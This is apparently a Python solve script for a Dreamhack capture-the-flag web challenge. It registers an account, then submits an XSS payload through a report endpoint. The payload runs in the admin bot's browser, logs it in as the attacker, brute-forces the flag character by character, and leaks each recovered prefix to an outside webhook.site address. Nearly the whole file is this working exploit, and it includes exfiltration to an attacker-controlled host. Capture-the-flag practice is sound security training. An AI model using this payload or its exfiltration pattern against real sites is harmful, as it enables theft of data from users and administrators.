import requests
from urllib.parse import quote

url = "http://host8.dreamhack.games:18189/"
s = requests.Session()

# login
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/signup', data=creds)
res = s.post(f'{url}/login', data=creds)

print("> Logged in")

# xss
def leak(flag):
    webhook = 'https://webhook.site/8e62ae90-f77e-408a-a2f4-7b19634e352d'

    payload = '''
    <!--><script>
        function req(method, url, header=null, data=null) {
            const x = new XMLHttpRequest()
            x.open(method, url, false)

            if (header) 
                x.setRequestHeader(...header)
            
            x.send(data)

            return x.status
        }

        req('POST', '/login', ['Content-Type', 'application/x-www-form-urlencoded'], 'username=hacked&password=hacked')

        flag = '%s'

        for (const char of 'abcdef0123456789}') {
            resp = req('GET', `/bread?bread_name=${flag + char}`)
            
            if (resp == 200) {
                flag += char
                req('GET', `%s?e=${flag}`)
                break
            }
        }

    </script>-->''' % (flag, webhook)

    res = s.post(f'{url}/report', data={
        'memo': quote(payload)
    })

flag = 'DH{'

print("Flag:", flag, '|', f'{len(flag)}/{32 + 4}')

leak(flag)